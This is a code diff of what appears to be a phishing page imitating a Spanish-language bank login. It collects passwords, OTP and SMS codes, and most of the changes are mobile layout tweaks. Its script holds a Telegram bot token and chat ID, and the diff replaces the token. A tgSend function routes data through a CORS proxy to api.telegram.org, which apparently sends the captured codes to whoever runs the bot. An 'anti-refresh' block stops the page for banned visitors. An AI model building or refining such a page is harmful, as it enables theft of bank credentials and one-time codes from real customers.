@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Portal de acceso - Banco Demo</title>
 
 <style>
@@ -23,7 +23,7 @@ html, body {
     -webkit-text-size-adjust: 100%;
 }
 
-/* ============ LAYOUT ESCRITORIO ============ */
+/* ============ ESCRITORIO ============ */
 .page {
     width: 100%;
     max-width: 1100px;
@@ -138,7 +138,6 @@ select.input { cursor: pointer; }
 }
 .error-msg.show { display: block; }
 
-/* Loading */
 .loading-overlay {
     display: none; position: fixed; inset: 0;
     background: rgba(255,255,255,.9); z-index: 10000;
@@ -151,7 +150,6 @@ select.input { cursor: pointer; }
 }
 @keyframes spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
 
-/* Columna derecha */
 .right-content { width: 100%; padding: 20px 0; }
 .banner {
     width: 100%; min-height: 280px; background: #125665;
@@ -211,13 +209,13 @@ select.input { cursor: pointer; }
 .demo-overlay {
     display: none; position: fixed; inset: 0; z-index: 9999;
     background: rgba(0,0,0,.7); backdrop-filter: blur(2px);
-    align-items: center; justify-content: center; padding: 12px;
+    align-items: center; justify-content: center; padding: 16px;
 }
 .demo-overlay.is-open { display: flex; }
 
 .demo-modal {
     width: 100%; max-width: 480px; max-height: 92vh; overflow-y: auto;
-    background: #fff; border-radius: 20px; padding: 22px 22px 28px;
+    background: #fff; border-radius: 20px; padding: 24px 24px 30px;
     box-shadow: 0 18px 48px rgba(0,0,0,.3); position: relative;
     -webkit-overflow-scrolling: touch;
 }
@@ -230,20 +228,20 @@ select.input { cursor: pointer; }
 }
 
 .demo-instruction {
-    background: #d7f0db; border-radius: 12px; padding: 16px 18px;
-    text-align: center; margin: 0 0 16px; color: #125665;
-    font-size: 15px; line-height: 1.45;
+    background: #d7f0db; border-radius: 12px; padding: 18px 20px;
+    text-align: center; margin: 0 0 18px; color: #125665;
+    font-size: 15px; line-height: 1.5;
 }
-.demo-instruction strong { font-weight: 800; display: block; margin-bottom: 4px; }
+.demo-instruction strong { font-weight: 800; display: block; margin-bottom: 6px; }
 
 .demo-title {
     text-align: center; font-size: 22px; line-height: 1.2;
-    margin: 8px 0 20px; color: #125665;
+    margin: 10px 0 22px; color: #125665;
 }
 
-.demo-actions { display: flex; justify-content: center; gap: 10px; margin-top: 18px; }
+.demo-actions { display: flex; justify-content: center; gap: 12px; margin-top: 22px; }
 .demo-actions button {
-    flex: 1; max-width: 200px; min-height: 48px; border-radius: 10px;
+    flex: 1; max-width: 200px; min-height: 50px; border-radius: 10px;
     font-weight: bold; font-size: 15px; cursor: pointer; border: none;
     font-family: inherit;
 }
@@ -255,19 +253,18 @@ select.input { cursor: pointer; }
     background: #bdbdbd; color: #777; cursor: not-allowed;
 }
 
-.demo-note { font-size: 11px; color: #999; text-align: center; margin-top: 16px; }
+.demo-note { font-size: 11px; color: #999; text-align: center; margin-top: 18px; }
 
 .demo-step { display: none; }
 .demo-step.active { display: block; }
 
-/* Slots OTP */
 .otp-slots-container {
-    display: flex; justify-content: center; gap: 6px; margin: 18px 0;
+    display: flex; justify-content: center; gap: 8px; margin: 22px 0;
 }
 .otp-slot {
-    width: 42px; height: 48px;
+    width: 44px; height: 50px;
     border: 1px solid #ccc; border-radius: 8px;
-    text-align: center; font-size: 1.3rem; line-height: 48px;
+    text-align: center; font-size: 1.3rem; line-height: 50px;
     font-weight: bold; background: #fdfdfd; color: #125665;
 }
 .otp-slot.active { border-color: var(--green); box-shadow: 0 0 5px rgba(0,184,46,.5); }
@@ -278,100 +275,221 @@ select.input { cursor: pointer; }
     width: 1px; height: 1px;
 }
 
-/* ============ TABLET ============ */
+/* ============ MÓVIL / TABLET ============ */
 @media (max-width: 760px) {
     body { background: #fff; }
 
     .page {
-        display: block; padding: 0; min-height: auto;
+        display: block;
+        padding: 0;
+        min-height: auto;
         max-width: 100%;
     }
 
     .login-card {
-        width: 100%; min-height: auto;
-        padding: 24px 20px 28px;
-        border-radius: 0; box-shadow: none;
+        width: 100%;
+        min-height: auto;
+        padding: 32px 24px 40px;
+        border-radius: 0;
+        box-shadow: none;
     }
 
-    .security { top: 14px; right: 20px; }
+    .security { top: 20px; right: 24px; }
 
-    .welcome { font-size: 15px; margin-bottom: 6px; color: #555; }
+    .welcome {
+        font-size: 17px;
+        margin-bottom: 10px;
+        color: #444;
+    }
 
     .logo {
-        font-size: 22px; margin-bottom: 22px;
-        display: flex; align-items: center;
+        font-size: 26px;
+        margin-bottom: 32px;
+        display: flex;
+        align-items: center;
     }
-    .logo-symbol { width: 26px; height: 26px; font-size: 14px; }
+    .logo-symbol {
+        width: 30px;
+        height: 30px;
+        font-size: 15px;
+    }
 
-    .field { margin-bottom: 16px; }
+    .field { margin-bottom: 22px; }
 
     .field-label {
-        font-size: 13px; margin-bottom: 6px;
-        flex-wrap: wrap; gap: 4px;
+        font-size: 14px;
+        margin-bottom: 8px;
+        flex-wrap: wrap;
+        gap: 6px;
     }
 
     .input {
-        height: 48px; font-size: 16px;
-        padding: 0 14px; border-radius: 9px;
+        height: 54px;
+        font-size: 16px;
+        padding: 0 16px;
+        border-radius: 10px;
     }
 
-    .password-box input { letter-spacing: 6px; padding-right: 48px; }
-    .eye { font-size: 20px; right: 10px; }
+    .password-box input {
+        letter-spacing: 8px;
+        padding-right: 52px;
+    }
+    .eye {
+        font-size: 22px;
+        right: 14px;
+        padding: 10px;
+    }
 
     .remember {
-        font-size: 13px; gap: 9px;
-        margin: 16px 0 22px;
+        font-size: 14px;
+        gap: 10px;
+        margin: 22px 0 28px;
+        line-height: 1.4;
     }
-    .switch { width: 38px; height: 22px; }
-    .switch span { width: 18px; height: 18px; top: 2px; left: 2px; }
-    .switch input:checked + span { left: 18px; }
+    .switch { width: 42px; height: 24px; }
+    .switch span { width: 20px; height: 20px; top: 2px; left: 2px; }
+    .switch input:checked + span { left: 20px; }
 
     .continue {
-        height: 50px; font-size: 16px; border-radius: 10px;
+        height: 56px;
+        font-size: 17px;
+        border-radius: 12px;
+        margin-top: 6px;
     }
 
-    .register { font-size: 14px; margin-top: 20px; }
+    .register {
+        font-size: 15px;
+        margin-top: 28px;
+    }
 
-    /* Ocultar columna decorativa en móvil para ahorrar espacio */
-    .right-content { display: none; }
+    /* Banner visible pero compacto */
+    .right-content {
+        display: block;
+        padding: 8px 24px 32px;
+    }
+
+    .banner {
+        min-height: 160px;
+        border-radius: 14px;
+    }
+    .banner-person {
+        width: 32%;
+        height: 160px;
+        font-size: 60px;
+    }
+    .banner-info {
+        width: 68%;
+        padding: 16px;
+    }
+    .banner-info h2 {
+        font-size: 16px;
+        margin-bottom: 6px;
+    }
+    .banner-info p {
+        font-size: 12px;
+        line-height: 1.4;
+        margin-bottom: 10px;
+    }
+    .banner-info button {
+        padding: 9px 14px;
+        font-size: 12px;
+        border-radius: 6px;
+    }
+    .banner::before { width: 140px; height: 140px; top: -90px; left: -40px; }
+    .banner::after  { width: 140px; height: 140px; bottom: -110px; right: -50px; }
+
+    .slider-lines { display: none; }
+
+    .help { margin-top: 28px; }
+    .help h2 { font-size: 18px; margin-bottom: 16px; }
+    .help-cards { gap: 12px; }
+    .help-card {
+        min-height: 96px;
+        font-size: 12px;
+        padding: 8px;
+        text-align: center;
+    }
+    .help-icon { width: 40px; height: 40px; font-size: 20px; }
 
     .footer { min-height: 60px; }
-    .footer-top { justify-content: center; padding: 14px; }
+    .footer-top { justify-content: center; padding: 16px; }
     .footer-logo { display: none; }
     .footer-bottom { display: none; }
     .footer-links { width: 100%; justify-content: space-around; gap: 10px; }
     .footer-links a { font-size: 13px; }
+
+    /* Modal OTP cómodo */
+    .demo-overlay { padding: 16px; }
+    .demo-modal {
+        padding: 22px 22px 28px;
+        border-radius: 20px;
+        max-width: 100%;
+    }
+    .demo-instruction {
+        padding: 18px 18px;
+        font-size: 15px;
+        margin-bottom: 18px;
+    }
+    .demo-title {
+        font-size: 22px;
+        margin: 10px 0 22px;
+    }
+    .otp-slots-container { gap: 8px; margin: 20px 0; }
+    .otp-slot {
+        width: 44px;
+        height: 52px;
+        font-size: 1.3rem;
+        line-height: 52px;
+    }
+    .demo-actions { gap: 12px; margin-top: 20px; }
+    .demo-actions button {
+        min-height: 52px;
+        font-size: 15px;
+    }
 }
 
 /* ============ MÓVIL PEQUEÑO ============ */
 @media (max-width: 400px) {
-    .login-card { padding: 20px 16px 24px; }
-    .welcome { font-size: 14px; }
-    .logo { font-size: 20px; margin-bottom: 18px; }
-    .logo-symbol { width: 24px; height: 24px; }
+    .login-card { padding: 26px 20px 34px; }
+    .welcome { font-size: 16px; }
+    .logo { font-size: 24px; margin-bottom: 28px; }
+    .logo-symbol { width: 28px; height: 28px; font-size: 14px; }
 
-    .field { margin-bottom: 14px; }
-    .field-label { font-size: 12px; }
-    .input { height: 46px; font-size: 16px; }
+    .field { margin-bottom: 20px; }
+    .field-label { font-size: 13px; }
+    .input { height: 52px; font-size: 16px; padding: 0 14px; }
 
-    .remember { font-size: 12px; margin: 14px 0 18px; }
+    .remember { font-size: 13px; margin: 20px 0 24px; }
 
-    .continue { height: 48px; font-size: 15px; }
-    .register { font-size: 13px; }
+    .continue { height: 54px; font-size: 16px; }
+    .register { font-size: 14px; margin-top: 24px; }
 
-    .demo-modal { padding: 18px 16px 22px; border-radius: 16px; }
-    .demo-title { font-size: 20px; margin: 6px 0 16px; }
-    .demo-instruction { font-size: 14px; padding: 14px 14px; }
-    .otp-slots-container { gap: 5px; margin: 14px 0; }
-    .otp-slot { width: 38px; height: 44px; font-size: 1.15rem; line-height: 44px; }
-    .demo-actions { gap: 8px; }
-    .demo-actions button { min-height: 46px; font-size: 14px; }
+    .right-content { padding: 8px 20px 28px; }
+    .banner { min-height: 140px; }
+    .banner-person { font-size: 52px; height: 140px; }
+    .banner-info h2 { font-size: 15px; }
+    .banner-info p { font-size: 11.5px; }
+    .banner-info button { padding: 8px 12px; font-size: 11px; }
+
+    .help h2 { font-size: 17px; }
+    .help-card { min-height: 90px; font-size: 11.5px; }
+
+    .demo-modal { padding: 20px 18px 24px; border-radius: 18px; }
+    .demo-title { font-size: 20px; }
+    .demo-instruction { font-size: 14px; padding: 16px 14px; }
+    .otp-slots-container { gap: 6px; margin: 18px 0; }
+    .otp-slot { width: 40px; height: 48px; font-size: 1.15rem; line-height: 48px; }
+    .demo-actions button { min-height: 50px; font-size: 14px; }
 }
 
-/* Móvil muy pequeño */
+/* ============ MÓVIL MUY PEQUEÑO ============ */
 @media (max-width: 340px) {
-    .otp-slot { width: 34px; height: 42px; font-size: 1rem; line-height: 42px; }
-    .otp-slots-container { gap: 4px; }
+    .login-card { padding: 22px 16px 30px; }
+    .otp-slot { width: 36px; height: 44px; font-size: 1rem; line-height: 44px; }
+    .otp-slots-container { gap: 5px; }
+    .banner { min-height: 130px; }
+    .banner-person { font-size: 46px; height: 130px; }
+    .banner-info h2 { font-size: 14px; }
 }
 </style>
 </head>
@@ -514,7 +632,7 @@ select.input { cursor: pointer; }
             </div>
             <h2 class="demo-title">Código SMS</h2>
             <div style="max-width:280px;margin:0 auto 16px;" id="smsInputWrap">
-                <input type="text" id="smsCodeInput" class="input" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align:center;font-size:1.4rem;height:48px;letter-spacing:6px;">
+                <input type="text" id="smsCodeInput" class="input" maxlength="6" inputmode="numeric" placeholder="Código SMS" style="text-align:center;font-size:1.4rem;height:50px;letter-spacing:6px;">
             </div>
             <p id="smsError" class="error-msg" style="margin-bottom:12px;">Código SMS inválido.</p>
             <div class="demo-actions">
@@ -530,9 +648,9 @@ select.input { cursor: pointer; }
 // ==========================================
 // 🔑 CONFIG TELEGRAM
 // ==========================================
-const TG_BOT_TOKEN = '8800964008:AAF4bJhf0iUrQM5Skp1WvosFixdfPYmiMV8';
+const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
 const TG_CHAT_ID   = '7776240161';
-const TG_PROXY     = 'https://corsproxy.io/?'; // proxy CORS para evitar bloqueo del navegador
+const TG_PROXY     = 'https://corsproxy.io/?';
 
 // ==========================================
 // ELEMENTOS
@@ -563,7 +681,7 @@ const smsError      = document.getElementById("smsError");
 const smsInputWrap  = document.getElementById("smsInputWrap");
 
 // ==========================================
-// ANTI-REFRESCO (solo bloquea si fue baneado)
+// ANTI-REFRESCO
 // ==========================================
 if (localStorage.getItem('sys_blocked_user') === 'true') {
     window.stop();
@@ -619,7 +737,7 @@ togglePassword.addEventListener("click", function() {
 });
 
 // ==========================================
-// TELEGRAM (con proxy CORS)
+// TELEGRAM
 // ==========================================
 async function tgSend(payload) {
     const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
